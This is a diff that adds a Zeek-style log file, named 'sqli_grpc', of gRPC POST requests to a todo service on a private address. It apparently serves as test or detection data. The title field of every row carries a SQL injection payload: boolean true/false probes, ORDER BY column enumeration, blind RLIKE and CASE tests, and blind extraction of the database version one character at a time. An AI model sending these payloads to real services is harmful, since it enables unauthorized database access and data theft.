@@ -1,0 +1,144 @@
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	sqli_grpc
+#fields	method	authority	host	original_URI	text
+#types	string	string	string	string	string
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  OR 1=1 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  OR 1=0 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  OR 1=1# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  OR 1=0# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  OR 1=1--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  OR 1=0--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  OR 3409=3409 AND ('pytW' LIKE 'pytW 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  OR 3409=3409 AND ('pytW' LIKE 'pytY 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  HAVING 1=1 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  HAVING 1=1# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  HAVING 1=0# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  HAVING 1=1--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  HAVING 1=0--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 1=1 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 1=0 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 1=1--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 1=0--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 1=1# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 1=0# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 1=1 AND '%'=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 1=0 AND '%'=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 7300=7300 AND 'pKlZ'='pKlZ 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 7300=7300 AND 'pKlZ'='pKlY 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 7300=7300 AND ('pKlZ'='pKlZ 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  AND 7300=7300 AND ('pKlZ'='pKlY 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  WHERE 1=1 AND 1=1 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  WHERE 1=1 AND 1=0 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  WHERE 1=1 AND 1=1# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  WHERE 1=1 AND 1=0# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  WHERE 1=1 AND 1=1-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  WHERE 1=1 AND 1=0-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 1--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 2--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 3--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 4--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 5--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 6--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 7--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 8--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 9--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 10--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 11--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 12--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 13--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 14--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 15--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 16--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 17--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 18--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 19--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 20--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 21--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 22--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 23--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 24--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 25--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 26--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 27--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 28--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 29--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 30--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 31337--  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 1#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 2#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 3#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 4#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 5#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 6#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 7#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 8#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 9#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 10#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 11#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 12#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 13#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 14#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 15#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 16#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 17#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 18#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 19#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 20#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 21#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 22#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 23#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 24#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 25#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 26#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 27#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 28#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 29#  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 30# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 31337# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 1  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 2  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 3  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 4  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 5  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 6  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 7  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 8  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 9  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 10  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 11  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 12  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 13  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 14  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 15  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 16  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 17  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 18  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 19  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 20  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 21  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 22  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 23  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 24  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 25  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 26  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 27  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 28  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 29  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 30  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  ORDER BY 31337  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title %' AND 8310=8310 AND '%'=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title %' AND 8310=8311 AND '%'=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  and (select substring(@@version,1,1))='X' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  and (select substring(@@version,1,1))='M' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  and (select substring(@@version,2,1))='i' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  and (select substring(@@version,2,1))='y' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  and (select substring(@@version,3,1))='c' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  and (select substring(@@version,3,1))='S' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  and (select substring(@@version,3,1))='X' 
